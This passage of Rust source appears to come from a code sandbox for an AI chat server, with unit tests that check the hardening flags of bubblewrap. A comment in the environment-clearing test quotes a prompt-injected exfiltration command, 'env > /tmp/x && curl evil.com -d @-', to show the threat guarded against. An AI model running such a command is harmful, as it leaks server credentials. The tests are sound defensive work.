    pub(crate) fn target_fd_pub(&self) -> i32 { self.target_fd }
}

#[cfg(target_os = "linux")]
impl Drop for SeccompPipe {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.read_fd);
        }
    }
}

// --------------------------------------------------------------------
// Capped stdout/stderr capture.
// --------------------------------------------------------------------

async fn read_capped_owned<R: AsyncRead + Unpin + Send + 'static>(
    mut reader: R,
) -> (Vec<u8>, bool) {
    let mut buf = Vec::with_capacity(8 * 1024);
    let mut chunk = [0u8; 8 * 1024];
    let mut truncated = false;
    loop {
        match reader.read(&mut chunk).await {
            Ok(0) => break,
            Ok(n) => {
                if buf.len() + n > OUTPUT_CAP_BYTES {
                    let remain = OUTPUT_CAP_BYTES - buf.len();
                    buf.extend_from_slice(&chunk[..remain]);
                    truncated = true;
                    // Drain the rest so the writer doesn't block forever.
                    while reader.read(&mut chunk).await.unwrap_or(0) > 0 {}
                    break;
                }
                buf.extend_from_slice(&chunk[..n]);
            }
            Err(_) => break,
        }
    }
    (buf, truncated)
}

fn lossy_string_with_marker(buf: Vec<u8>, truncated: bool) -> String {
    let mut s = String::from_utf8_lossy(&buf).into_owned();
    if truncated {
        s.push_str(&format!(
            "\n[output truncated at {} bytes]\n",
            OUTPUT_CAP_BYTES
        ));
    }
    s
}

fn preview(s: &str, n: usize) -> &str {
    let end = s.char_indices().nth(n).map(|(i, _)| i).unwrap_or(s.len());
    &s[..end]
}

// Re-export so non-sandbox callers don't need to touch RawFd directly.
#[cfg(target_os = "linux")]
pub use std::os::fd::FromRawFd;

// Trait imports used above but otherwise unused locally — keep the
// imports honest in -Dwarnings builds.
#[cfg(target_os = "linux")]
#[allow(dead_code)]
fn _force_fd_imports(f: std::fs::File) -> RawFd {
    let fd = f.as_raw_fd();
    let _: std::fs::File = unsafe { std::fs::File::from_raw_fd(fd) };
    
    unsafe { std::fs::File::from_raw_fd(fd) }.into_raw_fd()
}

// =====================================================================
// Tier 1 unit tests — argv builder + output cap
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::core::config::CodeSandboxConfig;
    use crate::modules::code_sandbox::models::ConversationFile;
    use std::path::PathBuf;
    use std::sync::Arc;
    use uuid::Uuid;

    fn fake_caps() -> HardeningCapabilities {
        HardeningCapabilities {
            bwrap_path: PathBuf::from("/usr/bin/bwrap"),
            pid_namespace: PidNsMode::Strict,
            cgroup: CgroupMode::None,
            seccomp: SeccompMode::NotLinked,
        }
    }

    fn fake_host_caps() -> crate::modules::code_sandbox::types::HostCapabilities {
        crate::modules::code_sandbox::types::HostCapabilities {
            bwrap_path: PathBuf::from("/usr/bin/bwrap"),
            cgroup: CgroupMode::None,
            seccomp: SeccompMode::NotLinked,
        }
    }

    fn fake_state() -> CodeSandboxState {
        CodeSandboxState {
            config: CodeSandboxConfig {
                enabled: true,
                rootfs_path: Some("/opt/ziee-sandbox-rootfs/current".to_string()),
                cgroup_parent: String::new(),
                ..Default::default()
            },
            loopback_url: "http://127.0.0.1:8080/api/code-sandbox".to_string(),
            workspace_root: PathBuf::from("/tmp/ziee-workspace"),
            host_caps: fake_host_caps(),
            // Tests in this module exercise pure-Rust argv-builder
            // paths only, so the live DB hook is left None.
            pool: None,
        }
    }

    fn fake_ctx() -> SandboxContext {
        SandboxContext {
            conversation_id: Uuid::nil(),
            user_id: Uuid::nil(),
            workspace: PathBuf::from("/tmp/ws"),
            files: Arc::new(Vec::<ConversationFile>::new()),
        }
    }

    /// SQL-default-matching `CodeSandboxResourceLimits` for Tier-1 argv tests.
    /// Mirrors the migration-41 defaults so the prlimit assertions assert the
    /// same numbers the production server starts with on a fresh install.
    fn fake_limits() -> crate::modules::code_sandbox::resource_limits::CodeSandboxResourceLimits {
        use crate::modules::code_sandbox::resource_limits::CodeSandboxResourceLimits;
        let now = chrono::Utc::now();
        CodeSandboxResourceLimits {
            memory_max_bytes: 512 * 1024 * 1024,
            memory_swap_max_bytes: 0,
            pids_max: 256,
            cpu_max: "100000 100000".to_string(),
            address_space_bytes: 4 * 1024 * 1024 * 1024,
            fsize_bytes: 256 * 1024 * 1024,
            nproc_max: 256,
            nofile_max: 1024,
            cpu_secs_max: 1240,
            timeout_secs: 620,
            vm_idle_evict_secs: 900,
            mac_vm_vcpus: 2,
            mac_vm_ram_mib: 2048,
            vm_max_concurrent_execs: 3,
            created_at: now,
            updated_at: now,
        }
    }

    #[test]
    fn argv_clears_env_before_setenv() {
        // SECURITY regression test: --clearenv MUST appear before any
        // --setenv flag, so the server's full inherited environment
        // (DATABASE_URL, JWT secrets, every *_API_KEY) does not leak
        // into the sandboxed shell. Combined with --share-net, a
        // missing --clearenv would let a prompt-injected `env >
        // /tmp/x && curl evil.com -d @-` exfiltrate every secret the
        // server holds.
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "echo hi",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
        );

        let clearenv = argv
            .iter()
            .position(|a| a == "--clearenv")
            .expect("bwrap argv must include --clearenv");
        let first_setenv = argv
            .iter()
            .position(|a| a == "--setenv")
            .expect("expected at least one --setenv (HOME/USER/PATH)");

        assert!(
            clearenv < first_setenv,
            "--clearenv must come BEFORE the first --setenv; argv: {argv:?}"
        );

        // Sanity: the safe locale/TERM defaults we added alongside
        // --clearenv are present so rootfs tools (R, matplotlib,
        // click) still start cleanly.
        for required in &["HOME", "USER", "PATH", "LANG", "LC_ALL", "TERM"] {
            assert!(
                argv.iter().any(|a| a == required),
                "missing --setenv for {required}; argv: {argv:?}"
            );
        }
    }

    #[test]
    fn argv_always_terminates_user_input_with_dashdash() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "echo hello",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
        );
        // There should be at least one `--` before the prlimit wrapper.
        let prlimit_idx = argv
            .iter()
            .position(|a| a == "/usr/bin/prlimit")
            .expect("prlimit not in argv");
        let dashdash_before = argv[..prlimit_idx]
            .iter()
            .rposition(|a| a == "--")
            .expect("no -- before prlimit");
        // Nothing flag-like between the last `--` and prlimit (only
        // flag-like would be `--seccomp <fd>` which is correctly placed
        // before the `--`).
        assert!(prlimit_idx > dashdash_before);
    }

    #[test]
    fn argv_uses_dev_bind_proc_in_fallback_mode() {
        let mut caps = fake_caps();
        caps.pid_namespace = PidNsMode::DevBindFallback;
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
        );
        // Must use --dev-bind /proc /proc, NOT --proc /proc.
        assert!(argv.windows(3).any(|w| w == ["--dev-bind", "/proc", "/proc"]));
        assert!(!argv.windows(2).any(|w| w == ["--proc", "/proc"]));
        assert!(!argv.iter().any(|a| a == "--unshare-pid"));
        // SECURITY/CORRECTNESS regression: --as-pid-1 MUST NOT appear in
        // DevBindFallback mode — bwrap rejects it without --unshare-pid,
        // which would cause every sandboxed call to fail with exit=1
        // and a misleading "Specifying --as-pid-1 requires --unshare-pid"
        // message in stderr.
        assert!(
            !argv.iter().any(|a| a == "--as-pid-1"),
            "--as-pid-1 must be gated on --unshare-pid (Strict mode only)"
        );
    }

    #[test]
    fn argv_uses_strict_proc_when_pid_ns_strict() {
        let caps = fake_caps(); // PidNsMode::Strict
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
        );
        assert!(argv.iter().any(|a| a == "--unshare-pid"));
        assert!(argv.windows(2).any(|w| w == ["--proc", "/proc"]));
        // Strict mode IS allowed to use --as-pid-1 (and we do).
        assert!(argv.iter().any(|a| a == "--as-pid-1"));
    }

    #[test]
    fn argv_masks_dangerous_proc_files() {
        // G2: /proc/{sysrq-trigger,kcore,kallsyms,kmsg} must be masked over
        // /dev/null in every mode (critical in DevBindFallback, defense in
        // depth in Strict). Regression guard against silently dropping a mask.
        for mode in [PidNsMode::Strict, PidNsMode::DevBindFallback] {
            let mut caps = fake_caps();
            caps.pid_namespace = mode;
            let state = fake_state();
            let ctx = fake_ctx();
            let argv = build_bwrap_argv(
                &caps,
                &state.workspace_root,
                &ctx,
                std::path::Path::new(state.config.rootfs_path()),
                "x",
                std::path::Path::new("/tmp/.sandbox_passwd"),
                std::path::Path::new("/tmp/.sandbox_group"),
                std::path::Path::new("/tmp/.sandbox_empty"),
                None,
                &fake_limits(),
            );
            for masked in ["/proc/sysrq-trigger", "/proc/kcore", "/proc/kallsyms", "/proc/kmsg"] {
                assert!(
                    argv.windows(3).any(|w| w == ["--ro-bind", "/dev/null", masked]),
                    "mode {mode:?}: must mask {masked} with --ro-bind /dev/null; argv: {argv:?}"
                );
            }
        }
    }

    #[test]
    fn argv_masks_dangerous_dotfiles_at_workspace_root() {
        // Mirrors Anthropic sandbox-runtime's DANGEROUS_FILES protection
        // (sandbox-utils.ts:11-22). Every entry in DANGEROUS_DOTFILES must
        // appear as `--ro-bind /dev/null /home/sandboxuser/<name>` in the argv
        // so an LLM-driven command can neither read the file (sees empty) nor
        // create / overwrite it (EROFS).
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
        );
        // The bind source is the empty-regular-file passed in (NOT /dev/null —
        // that's a char device on a `nodev` mount, which bash's `open()`
        // refuses with EACCES; see `build_bwrap_argv::mask_path` doc).
        for dotfile in DANGEROUS_DOTFILES {
            let expected = format!("/home/sandboxuser/{dotfile}");
            assert!(
                argv.windows(3)
                    .any(|w| w == ["--ro-bind", "/tmp/.sandbox_empty", expected.as_str()]),
                "must mask {dotfile} with --ro-bind /tmp/.sandbox_empty; argv: {argv:?}"
            );
        }
    }

    /// Phase 3 regression test: every security-critical flag must
    /// appear in the production argv. If anyone removes one, this
    /// test fails — preventing silent hardening regressions.
    #[test]
    fn argv_includes_all_security_critical_flags() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "echo hi",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
        );

        let must_have = [
            "--clearenv",        // env-var exfiltration defense
            "--unshare-user",    // user-namespace isolation
            "--unshare-uts",     // hostname isolation
            "--unshare-ipc",     // IPC isolation
            "--die-with-parent", // child dies on bwrap kill
            "--new-session",     // CVE-2017-5226 / TIOCSTI defense
            "--",                // CVE-2024-32462 arg-injection defense
            "/usr/bin/prlimit",  // rlimit wrapper applied to user code
            "/bin/bash",         // shell (specifically bash, NOT sh)
        ];
        for flag in &must_have {
            assert!(
                argv.iter().any(|a| a == flag),
                "production bwrap argv MUST include {flag}; full argv: {argv:?}"
            );
        }

        // Per-call rlimits must follow prlimit in order.
        let prlimit_idx = argv
            .iter()
            .position(|a| a == "/usr/bin/prlimit")
            .expect("prlimit not found");
        let rlimit_flags = [
            "--nproc=256",
            "--core=0",
            "--nofile=1024",
        ];
        for flag in &rlimit_flags {
            assert!(
                argv[prlimit_idx..].iter().any(|a| a == flag),
                "rlimit flag {flag} missing after prlimit; argv: {argv:?}"
            );
        }
    }

    #[test]
    fn argv_includes_seccomp_fd_only_when_provided() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv_without = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
        );
        assert!(!argv_without.iter().any(|a| a == "--seccomp"));

        let argv_with = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            Some(7),
            &fake_limits(),
        );
        assert!(argv_with.windows(2).any(|w| w == ["--seccomp", "7"]));
    }

    #[test]
    fn argv_prlimit_carries_expected_flags() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
        );
        let s = argv.join(" ");
        assert!(s.contains("/usr/bin/prlimit"));
        assert!(s.contains("--nproc=256"));
        assert!(s.contains("--core=0"));
        assert!(s.contains("--fsize="));
        assert!(s.contains("--as="));
    }

    #[test]
    fn output_cap_is_one_mib() {
        assert_eq!(OUTPUT_CAP_BYTES, 1024 * 1024);
    }

    #[tokio::test]
    async fn read_capped_truncates_at_one_mib() {
        // 2 MiB of bytes through the reader; expect exactly 1 MiB out.
        let big = vec![b'X'; 2 * 1024 * 1024];
        let cursor = std::io::Cursor::new(big);
        let (buf, truncated) = read_capped_owned(cursor).await;
        assert_eq!(buf.len(), OUTPUT_CAP_BYTES);
        assert!(truncated);
    }

    #[tokio::test]
    async fn read_capped_passes_through_short_output() {
        let cursor = std::io::Cursor::new(b"hello".to_vec());
        let (buf, truncated) = read_capped_owned(cursor).await;
        assert_eq!(&buf, b"hello");
        assert!(!truncated);
    }

    // ===================================================================
    // build_mcp_sandbox_argv — long-lived stdio MCP path
    // ===================================================================

    fn fake_mcp_params<'a>(
        caps: &'a HardeningCapabilities,
        rootfs: &'a Path,
        passwd: &'a Path,
        group: &'a Path,
        mask: &'a Path,
        home: &'a Path,
        env: &'a [(String, String)],
        binds: &'a [(String, String)],
    ) -> HardeningArgvParams<'a> {
        HardeningArgvParams {
            caps,
            rootfs_dir: rootfs,
            passwd_path: passwd,
            group_path: group,
            mask_path: mask,
            home_bind_source: home,
            seccomp_fd: None,
            extra_setenv: env,
            extra_ro_binds: binds,
        }
    }

    #[test]
    fn mcp_argv_is_direct_exec_no_bash_lc() {
        // The MCP path MUST NOT wrap the command in `bash -lc` — rmcp
        // pipes JSON-RPC bytes straight through bwrap into the MCP
        // server's stdin/stdout. A shell layer would corrupt that
        // byte stream (interpret control bytes, re-source dotfiles,
        // etc.).
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/tmp/mcp-home");
        let env: Vec<(String, String)> = vec![];
        let binds: Vec<(String, String)> = vec![];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/opt/embedded/bun"),
            &["x".to_string(), "@modelcontextprotocol/server-everything".to_string()],
            &fake_limits(),
        );
        assert!(!argv.iter().any(|a| a == "/bin/bash"));
        assert!(!argv.iter().any(|a| a == "-lc"));
        // Last meaningful tokens should be the resolved command + args.
        assert_eq!(argv[argv.len() - 3], "/opt/embedded/bun");
        assert_eq!(argv[argv.len() - 2], "x");
        assert_eq!(argv[argv.len() - 1], "@modelcontextprotocol/server-everything");
    }

    #[test]
    fn mcp_argv_keeps_security_critical_flags() {
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/tmp/mcp-home");
        let env: Vec<(String, String)> = vec![];
        let binds: Vec<(String, String)> = vec![];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/usr/bin/python3"),
            &["-m".to_string(), "echo".to_string()],
            &fake_limits(),
        );
        for required in &[
            "--clearenv",
            "--unshare-user",
            "--unshare-uts",
            "--unshare-ipc",
            "--share-net",
            "--new-session",
            "--die-with-parent",
            "--",
            "/usr/bin/prlimit",
        ] {
            assert!(
                argv.iter().any(|a| a == required),
                "missing flag {required}; argv: {argv:?}"
            );
        }
    }

    #[test]
    fn mcp_argv_injects_extra_setenv_after_clearenv() {
        // BLOCKED_ENV_VARS filtering happens at the stdio.rs call
        // site; here we trust the caller. The argv builder MUST place
        // the extra --setenv entries AFTER --clearenv (and after the
        // hard-coded HOME/USER/PATH block, by virtue of insertion
        // order in build_hardening_prefix) so they survive into the
        // sandbox.
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/tmp/mcp-home");
        let env = vec![
            ("MCP_API_KEY".to_string(), "abc123".to_string()),
            ("FOO".to_string(), "bar".to_string()),
        ];
        let binds: Vec<(String, String)> = vec![];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/usr/bin/python3"),
            &[],
            &fake_limits(),
        );
        let clearenv_idx = argv.iter().position(|a| a == "--clearenv").unwrap();
        // Look for the windows ["--setenv", "MCP_API_KEY", "abc123"] and
        // ["--setenv", "FOO", "bar"] anywhere after --clearenv.
        for (key, val) in &[("MCP_API_KEY", "abc123"), ("FOO", "bar")] {
            let pos = argv
                .windows(3)
                .position(|w| w[0] == "--setenv" && &w[1] == key && &w[2] == val)
                .unwrap_or_else(|| panic!("missing --setenv for {key}; argv: {argv:?}"));
            assert!(pos > clearenv_idx, "--setenv {key} must come after --clearenv");
        }
    }

    #[test]
    fn mcp_argv_emits_extra_ro_binds() {
        // The embedded-binary bind for uv/bun lands here. Test that
        // an arbitrary extra_ro_binds entry shows up as
        // [`--ro-bind-try`, host, sandbox].
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/tmp/mcp-home");
        let env: Vec<(String, String)> = vec![];
        let binds = vec![(
            "/Users/admin/.ziee/bin".to_string(),
            "/Users/admin/.ziee/bin".to_string(),
        )];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/Users/admin/.ziee/bin/bun"),
            &["x".to_string()],
            &fake_limits(),
        );
        let found = argv.windows(3).any(|w| {
            w[0] == "--ro-bind-try"
                && w[1] == "/Users/admin/.ziee/bin"
                && w[2] == "/Users/admin/.ziee/bin"
        });
        assert!(found, "missing extra ro-bind window; argv: {argv:?}");
    }

    #[test]
    fn mcp_argv_homes_at_per_server_workspace() {
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/var/lib/ziee/sandboxes/mcp/abcd");
        let env: Vec<(String, String)> = vec![];
        let binds: Vec<(String, String)> = vec![];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/bin/echo"),
            &["hi".to_string()],
            &fake_limits(),
        );
        let bind_idx = argv
            .windows(3)
            .position(|w| {
                w[0] == "--bind"
                    && w[1] == "/var/lib/ziee/sandboxes/mcp/abcd"
                    && w[2] == "/home/sandboxuser"
            })
            .expect("home bind not found");
        // Confirm --chdir /home/sandboxuser follows shortly.
        assert!(argv[bind_idx..]
            .windows(2)
            .any(|w| w[0] == "--chdir" && w[1] == "/home/sandboxuser"));
    }
}
